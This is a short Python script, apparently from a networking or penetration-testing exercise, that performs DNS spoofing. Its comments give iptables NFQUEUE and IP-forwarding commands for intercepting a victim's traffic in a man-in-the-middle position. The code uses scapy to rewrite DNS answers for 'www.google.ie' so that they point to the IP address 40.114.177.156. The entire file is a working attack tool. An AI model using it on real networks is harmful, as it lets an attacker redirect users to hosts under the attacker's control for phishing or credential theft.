#!/usr/bin/env python

#https://github.com/kti/python-netfilterqueue
#Work on VM
#sudo iptables -I FORWARD -j NFQUEUE --queue-num 0  Move packets into FORWARD queue
#sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' IP forwarding

#Work Locally
#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#sudo iptables -I INPUT -j NFQUEUE --queue-num 0

#sudo iptables --flush  

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	#print(scapy_packet.show())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "www.google.ie" in str(qname):
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata="40.114.177.156")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			#Delete length and checksum arguments will be auto added 
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(bytes(scapy_packet))
		

	packet.accept()
	#packet.drop()

nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()